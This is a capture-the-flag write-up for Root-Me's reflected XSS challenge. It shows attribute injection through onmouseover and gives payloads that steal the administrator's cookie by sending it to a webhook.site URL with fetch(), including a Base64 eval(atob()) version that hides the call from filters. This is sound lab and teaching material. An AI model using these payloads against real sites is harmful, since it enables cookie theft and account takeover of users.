@@ -1,0 +1,66 @@
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+
+<style>
+  img {
+    max-width: 100%;
+  }
+
+  * {
+    color: yellow;
+  }
+</style>
+<div style="background-color: #119446; padding: 10px; border: 10px ridge lightblue;">
+  <h1 id="xss-reflected">XSS - Reflected</h1>
+  <h2 id="statement">Statement</h2>
+  <p>Find a way to steal the administrator’s cookie.
+    Be careful, this administrator is aware of info security and he does not click on strange links that he could
+    receive.</p>
+  <h2 id="analyze">Analyze</h2>
+  <p>We have this website (<em><a
+        href="http://challenge01.root-me.org/web-client/ch26">http://challenge01.root-me.org/web-client/ch26</a></em>)
+    about VALHALLA INC.</p>
+  <p>Quickly we found the page <code>/?p=about</code> in <strong>About</strong> section.
+    <img src="/images/rootme/xss-reflected-1.png" alt="About page, VALHALLA INC." title="About page, VALHALLA INC.">
+  </p>
+  <p>Let&#39;s test with <code>/?p=test</code> to see the result.
+    <img src="/images/rootme/xss-reflected-2.png" alt="?p=test page, VALHALLA INC." title="?p=test page, VALHALLA INC.">
+  </p>
+  <p><code>test</code> is displayed as hyperlink inside <code>&lt;a&gt;</code> tag, we can start testing XSS payloads.
+  </p>
+  <ul>
+    <li>First attempt: <code>?p=&lt;b&gt;test&lt;/b&gt;</code> : The payload is filetered with HTML Entity.</li>
+    <li>Second attempt: <code>?p=&#39; target=&#39;alert(1)</code> : We tinker with <code>&lt;a&gt;</code> but it gave
+      nothing.</li>
+    <li>Third attempt: <code>?p=&#39; onmouseover=&#39;alert(1)</code> : After some research, the
+      <code>onmouseover</code> attributes appear in global attributes (<a
+        href="https://www.w3schools.com/tags/ref_eventattributes.asp">https://www.w3schools.com/tags/ref_eventattributes.asp</a>),
+      we test it and it work !
+    </li>
+  </ul>
+  <p><img src="/images/rootme/xss-reflected-3.png" alt="&quot;alert(1) with onmouseover in query&quot;"
+      title="alert(1) with onmouseover in query"></p>
+  <h2 id="exploitation">Exploitation</h2>
+  <p>So, with <code>onmouseover</code> attributes, all we have left to do is to use <code>fetch()</code> on a webhook
+    with <code>document.cookie</code> in URL query.</p>
+  <p><strong>Payload:</strong><br>
+    <code>?p=&#39;
+      onmouseover=&#39;fetch(&quot;https://webhook.site/6d5ede82-cc64-4a47-935a-c35dd94c368b?&quot;%2Bdocument.cookie)</code>
+  </p>
+  <p>This payload doesn&#39;t work when reporting to the administrator, this is because the statement says: &quot;<em>Be
+      careful, this administrator is aware of info security and <ins>he does not click on strange links that he could
+        receive.</ins></em>&quot;</p>
+  <p>The <code>https://webhook.site/6d5ede82-cc64-4a47-935a-c35dd94c368b?&quot;%2Bdocument.cookie</code> is too
+    suspicious, we need to hide it to bypass filters.</p>
+  <p>To do that I use an <code>eval(atob())</code> with our <code>fetch(xxx)</code> encoded in Base64</p>
+  <p><strong>New payload:</strong><br>
+    <code>?p=&#39;
+      onmouseover=&#39;eval(atob(&quot;ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzZkNWVkZTgyLWNjNjQtNGE0Ny05MzVhLWMzNWRkOTRjMzY4Yj8iK2RvY3VtZW50LmNvb2tpZSk=&quot;))</code>
+  </p>
+  <p>After waiting some minutes we obtain the flag:
+    <code>https://webhook.site/6d5ede82-cc64-4a47-935a-c35dd94c368b?flag=xxxxxxxxxxxxxxxxx</code>
+  </p>
+
+</div>
+
+<script>hljs.highlightAll();</script>
